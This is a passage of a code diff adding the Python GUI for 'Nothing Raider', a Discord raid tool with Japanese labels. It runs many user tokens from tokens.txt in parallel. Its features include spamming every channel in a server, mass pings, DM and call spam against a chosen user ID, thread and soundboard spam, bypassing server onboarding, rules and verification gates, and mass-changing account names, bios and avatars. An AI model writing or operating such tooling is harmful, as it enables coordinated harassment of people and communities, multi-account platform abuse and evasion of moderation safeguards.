+            threads.append(thread)
+            thread.start()
+    
+    def stop_fake_typers():
+        global threads
+        global stop_event
+
+        stop_event.set()
+        for thread in threads:
+            thread.join() 
+        threads = []
+        print("Fake Typerを止めました")
+
+    fake_typer_button = ctk.CTkButton(frame, text="Fake Typer開始", command=start_fake_typers)
+    fake_typer_button.pack(pady=5)
+
+    stop_button = ctk.CTkButton(frame, text="停止", command=stop_fake_typers)
+    stop_button.pack(pady=5)
+
+def all_channel_spam_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+    server_label = ctk.CTkLabel(frame, text="GuildID")
+    server_label.pack(pady=5)
+    server_entry = ctk.CTkEntry(frame)
+    server_entry.pack(pady=5)
+    message_label = ctk.CTkLabel(frame, text="メッセージ")
+    message_label.pack(pady=5)
+    message_entry = ctk.CTkTextbox(frame, width=500, height=300)
+    message_entry.pack(pady=5)
+    all_spam_button = ctk.CTkButton(frame, text="Start", command=lambda: threading.Thread(target=all_channel_spam, args=(server_entry.get(), message_entry.get("1.0", "end-1c"))).start())
+    all_spam_button.pack(pady=5)
+    all_spam_stop_button = ctk.CTkButton(frame, text="Stop", command=stop_all_channel_spam)
+    all_spam_stop_button.pack(pady=0)
+
+def text_random_spam_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+    channel_label = ctk.CTkLabel(frame, text="ChannelID")
+    channel_label.pack(pady=5)
+    channel_entry = ctk.CTkEntry(frame)
+    channel_entry.pack(pady=5)
+    text_spam_button = ctk.CTkButton(frame, text="Start", command=lambda: threading.Thread(target=custom_spammer, args=(channel_entry.get(),)).start())
+    text_spam_button.pack(pady=20)
+    stop_text_spam_button = ctk.CTkButton(frame, text="Stop", command=lambda: threading.Thread(target=stop_custom_spammer, args=(channel_entry.get(),)).start())
+    stop_text_spam_button.pack(pady=0)
+
+def bot_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+    channel_label = ctk.CTkLabel(frame, text="ChannelID")
+    channel_label.pack(pady=5)
+    channel_entry = ctk.CTkEntry(frame)
+    channel_entry.pack(pady=5)
+    bot_button = ctk.CTkButton(frame, text="Start", command=lambda: howbot(channel_entry.get()))
+    bot_button.pack(pady=20)
+
+def onliner_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+    onliner_button = ctk.CTkButton(frame, text="Onliner", command=lambda: threading.Thread(target=change_status_wrapper()).start())
+    onliner_button.pack(pady=20)
+
+def change_status_wrapper():
+    tokens = read_tokens('tokens.txt')
+    for token in tokens:
+        threading.Thread(target=change_status, args=(token,)).start()
+
+def stop_spammer():
+    global spamming
+    spamming = False
+
+# GUI部分（マスピングオプション追加）
+def new_spammer_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+
+    # Channel ID
+    channel_label = ctk.CTkLabel(frame, text="Channel ID")
+    channel_label.pack(pady=0)
+    channel_entry = ctk.CTkEntry(frame, width=400)
+    channel_entry.pack(pady=0)
+
+    # Guild ID（マスピング用）
+    guild_label = ctk.CTkLabel(frame, text="Guild ID (Mass pingを使う場合は必要)")
+    guild_label.pack(pady=0)
+    guild_entry = ctk.CTkEntry(frame, width=400)
+    guild_entry.pack(pady=0)
+
+    # Message
+    message_label = ctk.CTkLabel(frame, text="メッセージ")
+    message_label.pack(pady=0)
+    message_entry = ctk.CTkTextbox(frame, width=500, height=200)
+    message_entry.pack(pady=0)
+
+    # マスピングオプション
+    mass_ping_var = ctk.BooleanVar(value=False)
+    mass_ping_check = ctk.CTkCheckBox(frame, text="Mass Pingを有効にする", variable=mass_ping_var)
+    mass_ping_check.pack(pady=0)
+
+    ping_count_label = ctk.CTkLabel(frame, text="メンション数 (1-10)")
+    ping_count_label.pack(pady=0)
+    ping_count_entry = ctk.CTkEntry(frame, width=100)
+    ping_count_entry.insert(0, "3")  # デフォルト値
+    ping_count_entry.pack(pady=0)
+
+    # Start/Stopボタン
+    start_button = ctk.CTkButton(frame, text="Start", command=lambda: threading.Thread(target=spammer, args=(
+        channel_entry.get(),
+        message_entry.get("1.0", "end-1c"),
+        guild_entry.get(),
+        mass_ping_var.get(),
+        int(ping_count_entry.get() or 0)
+    )).start())
+    start_button.pack(pady=5)
+
+    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_spammer)
+    stop_button.pack(pady=5)
+
+def command_spammer_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+
+    # Guild ID
+    guild_label = ctk.CTkLabel(frame, text="Guild ID")
+    guild_label.pack(pady=5)
+    guild_entry = ctk.CTkEntry(frame, width=400)
+    guild_entry.pack(pady=5)
+
+    # Channel ID
+    channel_label = ctk.CTkLabel(frame, text="Channel ID")
+    channel_label.pack(pady=5)
+    channel_entry = ctk.CTkEntry(frame, width=400)
+    channel_entry.pack(pady=5)
+
+    # Application ID
+    app_label = ctk.CTkLabel(frame, text="Application ID")
+    app_label.pack(pady=5)
+    app_entry = ctk.CTkEntry(frame, width=400)
+    app_entry.pack(pady=5)
+
+    # Command Name
+    command_label = ctk.CTkLabel(frame, text="コマンド名")
+    command_label.pack(pady=5)
+    command_entry = ctk.CTkEntry(frame, width=400)
+    command_entry.pack(pady=5)
+
+    # Startボタン
+    def start_spamming():
+        guild_id = guild_entry.get()
+        channel_id = channel_entry.get()
+        application_id = app_entry.get()
+        command_name = command_entry.get()
+        session_id = str(uuid.uuid4())  # UUID4でsession_idを生成
+
+        # 最初のトークンを使用してcommand_idを取得
+        command_id = get_command_id(tokens[0], guild_id, application_id, command_name)
+        if command_id:
+            threading.Thread(
+                target=slash_command_spammer,
+                args=(guild_id, channel_id, application_id, command_id, command_name, session_id, tokens)
+            ).start()
+        else:
+            print("Failed to retrieve command_id.")
+
+    start_button = ctk.CTkButton(frame, text="Start", command=start_spamming)
+    start_button.pack(pady=5)
+
+    # Stopボタン
+    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_spammer)
+    stop_button.pack(pady=5)
+    
+def change_global_name_ui(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+    
+    name_label = ctk.CTkLabel(frame, text="ユーザー名チェンジャー (nick.txtからランダムに)")
+    name_label.pack(pady=5)
+    
+    def start_name_changer():
+        with open("tokens.txt", "r", encoding="utf-8") as token_file:
+            tokens = token_file.read().splitlines()
+        
+        try:
+            with open("nick.txt", "r", encoding="utf-8") as nick_file:
+                names = nick_file.read().splitlines()
+        except UnicodeDecodeError:
+            print("nick.txtが読み取れません。")
+            return
+        
+        for token in tokens:
+            random_name = random.choice(names)
+            threading.Thread(target=change_global_name, args=(token, random_name)).start()
+    
+    change_name_button = ctk.CTkButton(frame, text="表示名を変更", command=start_name_changer)
+    change_name_button.pack(pady=20)
+
+def info(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+    Loaded_Tokenlabel = ctk.CTkLabel(frame, text=f"読み込まれたtoken {token_count}個")
+    Loaded_Tokenlabel.pack(pady=5)
+    label1 = ctk.CTkLabel(frame, text="Ver - Release v2")
+    label1.pack(pady=5)
+    label2 = ctk.CTkLabel(frame, text="Note - Capsolverはメンテナンス中のため、Discordでは使用できません。")
+    label2.pack(pady=5)
+    label3 = ctk.CTkLabel(frame, text="Update - バグの修正")
+    label3.pack(pady=5)
+    label4 = ctk.CTkLabel(frame, text="Update - Format Changer追加したよ")
+    label4.pack(pady=5)
+
+def open_dm_spam_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+    warn_label = ctk.CTkLabel(frame, text="このオプションはtokenの寿命を非常に削ります。注意して使用してください。")
+    warn_label.pack(pady=5)
+    user_id_label = ctk.CTkLabel(frame, text="User ID")
+    user_id_label.pack(pady=5)
+    user_id_entry = ctk.CTkEntry(frame, width=200)
+    user_id_entry.pack(pady=5)
+
+    message_label = ctk.CTkLabel(frame, text="メッセージ")
+    message_label.pack(pady=5)
+    message_entry = ctk.CTkTextbox(frame, width=400, height=150)
+    message_entry.pack(pady=5)
+
+    dm_spam_var = ctk.IntVar()
+    call_spam_var = ctk.IntVar()
+
+    dm_spam_checkbox = ctk.CTkCheckBox(frame, text="DM Spam", variable=dm_spam_var)
+    dm_spam_checkbox.pack(pady=5)
+
+    call_spam_checkbox = ctk.CTkCheckBox(frame, text="Call Spam", variable=call_spam_var)
+    call_spam_checkbox.pack(pady=5)
+
+    def start_spamming():
+        global stop_spamming
+        stop_spamming = False
+        user_id = user_id_entry.get().strip()
+        message = message_entry.get("1.0", "end-1c").strip()
+        dm_spam = dm_spam_var.get()
+        call_spam = call_spam_var.get()
+
+        if not user_id:
+            tkinter.messagebox.showwarning("Error", "ユーザーIDが指定されていません。")
+            return
+
+        if not dm_spam and not call_spam:
+            tkinter.messagebox.showwarning("Error", "どちらか選択してください。")
+            return
+        
+        tokens = read_tokens('tokens.txt')
+
+        for token in tokens:
+            thread = threading.Thread(target=open_dm_and_spam, args=(user_id, message, dm_spam, call_spam, token))
+            thread.start()
+
+    def stop_spamming_fn():
+        global stop_spamming
+        stop_spamming = True
+
+    spam_button = ctk.CTkButton(frame, text="Start", command=start_spamming)
+    spam_button.pack(pady=10)
+
+    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_spamming_fn)
+    stop_button.pack(pady=10)
+
+def start_vc_joining(tokens, guild, channel):
+    threads = []
+    for token in tokens:
+        thread = threading.Thread(target=vc_joiner, args=(token, guild, channel))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
+def start_soundboard_spam(link):
+    if not link.startswith("https://discord.com/channels/"):
+        print("Invalid channel link")
+        return
+
+    channel_id = link.split("/")[5]
+    guild_id = link.split("/")[4]
+
+    with open("tokens.txt", "r") as f:
+        tokens = f.read().splitlines()
+
+    for token in tokens:
+        threading.Thread(target=vc_joiner, args=(token, guild_id, channel_id)).start()
+        threading.Thread(target=soundboard, args=(token, channel_id)).start()
+
+def vc_joiner_ui(frame):
+    link_label = ctk.CTkLabel(frame, text="Channel Link")
+    link_label.pack(pady=10)
+    link_entry = ctk.CTkEntry(frame, width=400)
+    link_entry.pack(pady=10)
+    start_button = ctk.CTkButton(frame, text="Start Soundboard Spam", command=lambda: start_soundboard_spam(link_entry.get()))
+    start_button.pack(pady=20)
+
+def start_onboarding_bypass_ui(guild_id_entry):
+    guild_id = guild_id_entry.get()
+    start_onboarding_bypass(guild_id)
+
+def onboarding_bypass_tab(tab_frame):
+    ctk.CTkLabel(tab_frame, text="Onboarding Bypass").pack(pady=10)
+    guild_id_entry = ctk.CTkEntry(tab_frame, placeholder_text="Guild IDを入力", width=250)
+    guild_id_entry.pack(pady=5, padx=5)
+    start_button = ctk.CTkButton(tab_frame, text="Start", command=lambda: start_onboarding_bypass_ui(guild_id_entry))
+    start_button.pack(pady=10)
+
+def bio_changer_ui(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+
+    title_label = ctk.CTkLabel(frame, text="Bio Changer", font=("Arial", 20))
+    title_label.pack(pady=10)
+
+    bio_entry = ctk.CTkTextbox(frame, width=400, height=150)
+    bio_entry.pack(pady=5)
+
+    result_label = ctk.CTkLabel(frame, text="")
+    result_label.pack(pady=5)
+
+    def apply_bio_changes():
+        bio = bio_entry.get("1.0", "end-1c")
+        if not bio:
+            result_label.configure(text="Bio cannot be empty.")
+            return
+
+        try:
+            with open("tokens.txt", "r") as f:
+                tokens = f.read().splitlines()
+        except Exception as e:
+            result_label.configure(text=f"Error reading tokens: {e}")
+            return
+
+        results = []
+        results_lock = threading.Lock()
+
+        def worker(token):
+            try:
+                result = bio_changer(token, bio)
+                with results_lock:
+                    results.append(result)
+            except Exception as e:
+                with results_lock:
+                    results.append(f"Error with token {token}: {e}")
+
+        threads = []
+        for token in tokens:
+            thread = threading.Thread(target=worker, args=(token,))
+            thread.start()
+            threads.append(thread)
+
+        for thread in threads:
+            thread.join()
+
+    apply_button = ctk.CTkButton(frame, text="Apply Bio Change", command=apply_bio_changes)
+    apply_button.pack(pady=10)
+
+def bedrockbypassui(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+
+    guild_label = ctk.CTkLabel(frame, text="GuildID(サーバーid)")
+    guild_label.pack(pady=5)
+    
+    guild_entry = ctk.CTkEntry(frame, width=400)
+    guild_entry.pack(pady=5)
+
+    def on_bypass_click():
+        guild_id = guild_entry.get().strip()
+        if not guild_id:
+            tkinter.messagebox.showerror("入力ミス", "GuildIDが空です。")
+            return
+
+        def process_token_multithreaded(token):
+            try:
+                bypassBedrock(guild_id, token)
+            except ValueError as e:
+                tkinter.messagebox.showerror("エラー", f"正しくないGuildID: {e}")
+
+        def process_all_tokens():
+            threads = []
+            for token in tokens:
+                thread = threading.Thread(target=process_token_multithreaded, args=(token,))
+                thread.start()
+                threads.append(thread)
+
+            for thread in threads:
+                thread.join()
+
+        threading.Thread(target=process_all_tokens).start()
+
+    bypass_button = ctk.CTkButton(frame, text="Bypass Bedrock", command=on_bypass_click)
+    bypass_button.pack(pady=5)
+
+def rule_bypass_ui(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+
+    guild_label = ctk.CTkLabel(frame, text="GuildID")
+    guild_label.pack(pady=5)
+
+    guild_entry = ctk.CTkEntry(frame, width=400)
+    guild_entry.pack(pady=5)
+
+    def on_bypass_click():
+        guild_id = guild_entry.get().strip()
+        if not guild_id:
+            tkinter.messagebox.showerror("入力に誤りがあります", "GuildIDが正しくありません。")
+            return
+
+        for token in tokens:
+            threading.Thread(target=rule_bypass, args=(token, guild_id)).start()
+
+    newspam_button = ctk.CTkButton(frame, text="Rule bypass", command=on_bypass_click)
+    newspam_button.pack(pady=5)
+
+def avatar_changer_ui(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+
+    status_label = ctk.CTkLabel(frame, text="Avatar changer(先にonlinerを実行)")
+    status_label.pack(pady=5)
+
+    def on_avatar_change_click():
+
+
+        threading.Thread(target=start_avatar_change_threads()).start()
+
+    avatar_button = ctk.CTkButton(frame, text="Change Avatar", command=on_avatar_change_click)
+    avatar_button.pack(pady=5)
+
+def run_button_bypass(message_id, channel_id, guild_id, optionbutton):
+    with open("tokens.txt", "r") as f:
+        tokens = f.read().splitlines()
+
+    for token in tokens:
+        button_bypass(token, message_id, channel_id, guild_id, optionbutton)
+
+def button_pusher_ui(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+
+    message_label = ctk.CTkLabel(frame, text="メッセージリンク")
+    message_label.pack(pady=5)
+
+    message_entry = ctk.CTkEntry(frame, width=400)
+    message_entry.pack(pady=5)
+
+    option_label = ctk.CTkLabel(frame, text="どこのボタンを押すか(左から何番目か)")
+    option_label.pack(pady=5)
+
+    option_entry = ctk.CTkEntry(frame, width=400)
+    option_entry.pack(pady=5)
+
+    def on_button_click():
+        message_link = message_entry.get().strip()
+        button_option = option_entry.get().strip()
+
+        if not message_link:
+            tkinter.messagebox.showerror("入力に誤りがあります", "Message Linkを入力してください。")
+            return
+
+        if not message_link.startswith("https://"):
+            tkinter.messagebox.showerror("入力に誤りがあります", "URLの形式が正しくありません。")
+            return
+
+        parts = message_link.split("/")
+        if len(parts) < 7:
+            tkinter.messagebox.showerror("入力に誤りがあります", "URLの構造が正しくありません。")
+            return
+
+        guild_id = parts[4]
+        channel_id = parts[5]
+        message_id = parts[6]
+
+        if not button_option:
+            button_option = 0
+        else:
+            button_option = int(button_option)
+
+        try:
+            with open('tokens.txt', 'r') as file:
+                tokens = [line.strip() for line in file.readlines() if line.strip()]
+        except Exception as e:
+            print(f"tokenの読み込みに失敗|{e}")
+            return
+
+        max_workers = len(tokens)
+        executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_workers)
+
+        futures = [executor.submit(button_bypass, token, message_id, channel_id, guild_id, button_option) for token in tokens]
+
+        concurrent.futures.wait(futures)
+
+    button_push_button = ctk.CTkButton(frame, text="Button Pusher", command=on_button_click)
+    button_push_button.pack(pady=5)
+
+def thread_spam_ui(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+    fdsa = ctk.CTkLabel(frame, text="スレッドspammer|すぐレートリミットなります。")
+    fdsa.pack(pady=5)
+    channel_label = ctk.CTkLabel(frame, text="ChannelID")
+    channel_label.pack(pady=5)
+    channel_entry = ctk.CTkEntry(frame, width=400)
+    channel_entry.pack(pady=5)
+    label1 = ctk.CTkLabel(frame, text="スレッドの名前")
+    label1.pack(pady=5)
+    name_entry = ctk.CTkEntry(frame, width=400)
+    name_entry.pack(pady=5)
+
+    def on_spam_click():
+        channel_id = channel_entry.get().strip()
+        name = name_entry.get().strip()
+        if not channel_id:
+            tkinter.messagebox.showerror("入力に誤りがあります", "ChannelIDが正しくありません。")
+            return
+
+        for token in tokens:
+            threading.Thread(target=thread_spam, args=(token, channel_id, name)).start()
+
+    spam_button = ctk.CTkButton(frame, text="Thread Spam", command=on_spam_click)
+    spam_button.pack(pady=5)
+
+
+# Example usage
+if __name__ == "__main__":
+    file_pathy = "format.txt"
+
+
+
+if __name__ == "__main__":
+    root = ctk.CTk()  
+    iconfile = 'asset/icon.ico'
+    root.iconbitmap(default=iconfile)
+    root.title(f"Nothing Raider | Loaded {token_count} tokens")
+    root.geometry("900x500")
+    os.system('cls')
+    print("キーレスバージョンだから認証ないヨ。")
+    switch_to_main_ui()
+    root.mainloop()
